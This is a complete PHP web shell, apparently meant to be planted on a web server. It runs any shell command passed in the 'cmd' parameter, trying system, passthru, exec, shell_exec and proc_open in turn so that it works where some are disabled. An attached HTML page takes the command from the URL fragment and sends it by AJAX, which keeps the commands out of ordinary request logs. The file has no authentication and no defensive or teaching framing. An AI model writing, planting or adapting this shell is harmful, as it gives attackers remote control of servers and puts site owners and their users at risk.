<?php
// PHP code to execute command sent via AJAX
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    // Check for available functions
    function is_function_available($funcName) {
        return function_exists($funcName) && is_callable($funcName);
    }
    function get_available_executor() {
        $functions = ['system', 'passthru', 'exec', 'shell_exec', 'proc_open'];
        foreach ($functions as $func) {
            if (is_function_available($func)) {
                return $func;
            }
        }
        return null;
    }
    function execute_command($command) {
        $func = get_available_executor();
        if (!$func) {
            echo "No command execution functions are available.";
            return;
        }
        switch ($func) {
            case 'system':
                system($command);
                break;
            case 'passthru':
                passthru($command);
                break;
            case 'exec':
                $output = [];
                $status = 0;
                exec($command, $output, $status);
                echo implode("\n", $output);
                break;
            case 'shell_exec':
                echo shell_exec($command);
                break;
            case 'proc_open':
                $descriptorspec = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ];
                $process = proc_open($command, $descriptorspec, $pipes);
                if (is_resource($process)) {
                    echo stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    proc_close($process);
                }
                break;
        }
    }
    execute_command($command);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<title>Command via Fragment</title>
<script>
// When page loads, check for URL hash and send command
window.onload = function() {
    if (window.location.hash) {
        var command = window.location.hash.substring(1); // Remove '#'
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "be.php?cmd=" + encodeURIComponent(command), true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                // Show output in the page
                document.getElementById("output").innerText = xhr.responseText;
            }
        };
        xhr.send();
    }
};
</script>
</head>
<body>
<pre id="output" style="white-space: pre-wrap; border: 1px solid #ccc; padding: 10px; margin-top: 20px;"></pre>
</body>
</html>
